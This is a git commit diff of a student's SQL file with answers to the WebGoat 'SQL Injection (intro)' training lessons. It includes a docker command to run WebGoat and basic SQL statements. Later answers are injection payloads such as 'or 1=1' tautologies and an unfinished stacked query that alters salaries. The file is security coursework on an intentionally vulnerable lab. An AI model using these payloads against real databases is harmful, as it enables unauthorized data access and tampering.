379dad727487f2154940d93bcaa3178852acb507
KarlSemilla <karlsemilla1@gmail.com>
2020-03-08 23:13:35 -0600

    On test 12 in intro

--- assignment7.sql
+++ assignment7.sql
@@ -1,4 +1,11 @@
 sudo docker run -p 8080:8080 --name webgoat --rm -it -v ~/webgoatdata:/home/webgoat/.webgoat-8.0-8088465 webgoat/webgoat-8.0:latest
 
+-- SQL Injection (intro)
 1. select department from employees where last_name = 'Franco';
 2. update employees set department = 'Sales' where userid = '89762'; 
+3. alter table employees add phone varchar(20);
+4. grant alter table to 'UnauthorizedUser';
+9. SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith or 1 = 1';	
+10. Login_Count field = 0 and User_Id field = 0 or 1=1;
+11. For both fields ' or '1' = '1;
+12. EmployeeName=update employees set salary = '100000' where last_name = 'Smith' AuthTan = '
